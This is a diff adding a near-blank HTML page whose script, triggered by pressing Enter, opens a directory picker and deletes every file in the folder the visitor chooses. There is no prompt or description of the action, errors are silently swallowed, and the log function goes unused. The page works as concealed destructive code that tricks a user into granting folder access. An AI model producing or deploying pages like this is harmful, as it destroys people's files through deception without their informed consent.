@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+
+</head>
+<body>
+  <pre id="log"></pre>
+
+  <script>
+    const log = (msg) => {
+      document.getElementById('log').textContent += msg + "\n";
+    };
+
+    async function massDelete() {
+      try {
+        const dirHandle = await window.showDirectoryPicker();
+       
+
+        for await (const [name, handle] of dirHandle.entries()) {
+          if (handle.kind === 'file') {
+            await dirHandle.removeEntry(name);
+          }
+        }
+
+       
+      } catch (err) {
+     
+      }
+    }
+
+    window.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') {
+        massDelete();
+      }
+    });
+  </script>
+</body>
+</html>
